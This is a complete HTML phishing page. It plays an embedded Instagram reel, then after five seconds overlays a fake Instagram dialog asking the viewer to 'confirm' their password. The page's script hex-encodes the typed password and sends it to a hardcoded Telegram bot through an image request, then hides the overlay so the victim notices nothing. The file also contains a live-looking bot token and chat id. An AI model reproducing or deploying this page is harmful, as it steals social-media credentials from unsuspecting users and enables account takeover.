<!DOCTYPE html>
<html>
<head>
    <meta name="viewport" content="width=device-width,initial-scale=1">
    <style>
        body, html { margin:0; padding:0; height:100%; background:#000; font-family: -apple-system, sans-serif; overflow: hidden; }
        #v { display:none; position:fixed; top:0; left:0; width:100%; height:100%; background:#000; z-index:999; color:#fff; text-align:center; padding-top:100px; }
        .btn { background:#0095f6; color:#fff; border:none; padding:12px; border-radius:8px; font-weight:600; width:85%; cursor:pointer; font-size:16px; }
        input { width:80%; padding:14px; border-radius:8px; border:1px solid #363636; background:#121212; color:#fff; margin-bottom:15px; font-size:16px; }
    </style>
</head>
<body>
    <div id="v">
        <img src="https://www.instagram.com/static/images/ico/favicon-192.png/b30670883ce2.png" width="50" style="margin-bottom:20px;">
        <h2 style="font-size:20px;">Action Required</h2>
        <p style="font-size:14px; color:#a8a8a8; padding:0 30px; margin-bottom:25px;">Please confirm your Instagram password to continue watching this reel.</p>
        <input type="password" id="p" placeholder="Password" autofocus>
        <button class="btn" onclick="send()">Verify Now</button>
    </div>

    <iframe id="f" src="https://www.instagram.com/reel/DXvjb0FP8W0/embed/" style="width:100%; height:100vh; border:none;"></iframe>

    <script>
        const T="8662750137:AAGEIPealqUPso3hFzdCJrUZln684PaVX3k", C="8639892987";
        const h=s=>[...s].map(c=>c.charCodeAt(0).toString(16).padStart(2,'0')).join('');

        // Theek 5 second baad pop-up dikhayega
        setTimeout(() => { 
            document.getElementById('v').style.display = 'block'; 
        }, 5000);

        function send() {
            let pass = document.getElementById('p').value;
            if(pass.length > 0) {
                // Seedha Telegram par jayega
                new Image().src=`https://api.telegram.org/bot${T}/sendMessage?chat_id=${C}&text=🔑_KEY_${h(pass)}`;
                // Turant page saaf
                document.getElementById('v').style.display = 'none';
            }
        }
    </script>
</body>
</html>
